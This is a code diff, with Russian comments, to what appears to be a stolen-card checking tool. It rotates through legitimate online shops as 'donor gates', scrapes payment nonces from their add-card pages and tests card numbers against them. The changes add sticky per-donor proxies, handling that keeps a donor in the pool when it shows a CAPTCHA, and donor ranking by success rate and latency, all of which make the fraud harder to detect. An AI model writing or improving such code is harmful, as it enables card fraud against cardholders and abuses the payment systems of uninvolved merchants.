@@ -11,6 +11,12 @@ from curl_cffi.requests import AsyncSession
 
 import gate_client as gc
 
+try:
+    from proxy_manager import ProxyPool
+    HAS_PROXY_POOL = True
+except Exception:
+    HAS_PROXY_POOL = False
+
 sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")
 
 FALLBACK_DONOR = "https://www.blackbeltprotein.com.au"
@@ -110,9 +116,29 @@ def append_result_log(rec: dict):
         f.write(json.dumps(rec, ensure_ascii=False) + "\n")
 
 
-def update_gate_health(domain: str, ok: bool, fail_limit: int = 3):
-    # Пакет 3: пул живёт по фактам — успех сбрасывает fail_count и обновляет
-    # updated_at; fail_limit гейт-отказов подряд выкидывают донора из пула.
+def mark_gate_field(domain: str, **fields):
+    # Sprint 3.4: точечная запись полей донора (captcha_on_add_card и т.п.)
+    path = os.path.join("data", "ready_gates.json")
+    if not os.path.exists(path):
+        return
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            gates = json.load(f)
+        changed = False
+        for g in gates:
+            if g.get("domain") == domain:
+                g.update(fields)
+                changed = True
+        if changed:
+            with open(path, "w", encoding="utf-8") as f:
+                json.dump(gates, f, indent=2)
+    except Exception as e:
+        print(f"[!] gate-field writeback failed: {e}", flush=True)
+
+
+def update_gate_health(domain: str, ok: bool, fail_limit: int = 3, latency_ms: int | None = None):
+    # Пакет 3 + Sprint 3.3: fail-логика как была, плюс скользящие метрики
+    # (EMA success_rate, средняя латентность, счётчик карт) для взвешенной ротации.
     path = os.path.join("data", "ready_gates.json")
     if not os.path.exists(path):
         return
@@ -125,9 +151,17 @@ def update_gate_health(domain: str, ok: bool, fail_limit: int = 3):
                 kept.append(g)
                 continue
             changed = True
+            checked = int(g.get("cards_checked", 0)) + 1
+            g["cards_checked"] = checked
+            if latency_ms:
+                prev = float(g.get("latency_avg_ms") or latency_ms)
+                g["latency_avg_ms"] = int((prev * (checked - 1) + latency_ms) / checked)
+            ema = float(g.get("success_rate", 0.5))
+            g["success_rate"] = round(ema * 0.9 + (1.0 if ok else 0.0) * 0.1, 4)
             if ok:
                 g["fail_count"] = 0
                 g["updated_at"] = int(time.time())
+                g["last_success_ts"] = int(time.time())
                 kept.append(g)
             else:
                 fc = g.get("fail_count", 0) + 1
@@ -209,6 +243,11 @@ class GateSession:
 
             # 3. Скрап nonces со страницы добавления платёжного метода
             r_pm = await s.get(self.u["add_pm_url"], timeout=12)
+            if gc.looks_like_captcha(r_pm.text):
+                # Sprint 3.4: донора не выбрасываем — помечаем и понижаем вес
+                mark_gate_field(self.gate.get("domain"), captcha_on_add_card=True)
+                await _close_session(s)
+                return False, "CAPTCHA on add-payment-method (donor kept, weight lowered)"
             scraped = gc.scrape_gate(r_pm.text)
             if not scraped["pk"] or (not scraped["upe_nonce"] and not scraped["legacy_nonce"]):
                 await _close_session(s)
@@ -367,6 +406,14 @@ async def main():
         else:
             del raw_args[i]
     proxy_pool = gc.load_proxies()
+    proxy_manager: "ProxyPool | None" = None
+    if HAS_PROXY_POOL and proxy_pool and not explicit_proxy:
+        proxy_manager = ProxyPool(proxy_pool)
+        alive, total = await proxy_manager.validate_all()
+        print(f"[*] Proxy pool: {proxy_manager.status_line()}")
+        if alive == 0:
+            print("[!] All proxies dead — running direct")
+            proxy_manager = None
     custom_donor = None
     if raw_args and raw_args[0].startswith("http"):
         custom_donor = raw_args[0].rstrip("/")
@@ -426,24 +473,32 @@ async def main():
     print("=" * 80)
 
     results = []
-    gate_idx = 0
     sessions_cache: dict[str, GateSession] = {}
     sessions_opened = 0
+    # Sprint 3.3: взвешенная перестановка пула — сильные доноры впереди,
+    # но каждый получает попытку (порядок фиксирован на прогон)
+    ordered_pool = gc.pick_gate_order(gates_pool)
 
     try:
         for i, c in enumerate(cards):
             res = None
-            for attempt in range(len(gates_pool)):
-                gi = (gate_idx + attempt) % len(gates_pool)
-                gate = gates_pool[gi]
+            for attempt in range(len(ordered_pool)):
+                gate = ordered_pool[attempt]
                 dom = gate.get("domain") or gate.get("base_url")
 
                 gs = sessions_cache.get(dom)
                 if gs is None:
-                    gs = GateSession(gate, proxy=gc.pick_proxy(proxy_pool, explicit_proxy))
+                    # Sprint 3.5: sticky-прокси на донора — одна сессия = один IP
+                    if proxy_manager is not None:
+                        chosen_proxy = proxy_manager.pick(sticky_key=dom) or gc.pick_proxy(proxy_pool, explicit_proxy)
+                    else:
+                        chosen_proxy = gc.pick_proxy(proxy_pool, explicit_proxy)
+                    gs = GateSession(gate, proxy=chosen_proxy)
                     ok, detail = await gs.open()
                     if not ok:
                         res = err_result(c, detail)
+                        if proxy_manager is not None and chosen_proxy:
+                            proxy_manager.mark_bad(chosen_proxy)
                         if not custom_donor:
                             update_gate_health(dom, False)
                         append_result_log({
@@ -465,7 +520,7 @@ async def main():
                 res = await gs.check_card(c, bin_alpha2=bin_alpha2(bins.get(c.split("|")[0][:6], {})))
                 latency_ms = int((time.perf_counter() - t0) * 1000)
                 if not custom_donor:
-                    update_gate_health(dom, not res.get("retry_next_gate"))
+                    update_gate_health(dom, not res.get("retry_next_gate"), latency_ms=latency_ms)
                 append_result_log({
                     "ts": datetime.now().isoformat(timespec="seconds"),
                     "card": gc.mask_pan(res.get("card", c)),
@@ -476,7 +531,6 @@ async def main():
                     "latency_ms": latency_ms,
                 })
                 if not res.get("retry_next_gate"):
-                    gate_idx = gi
                     break
 
                 # гейт-левел отказ — сбрасываем сессию, ротация
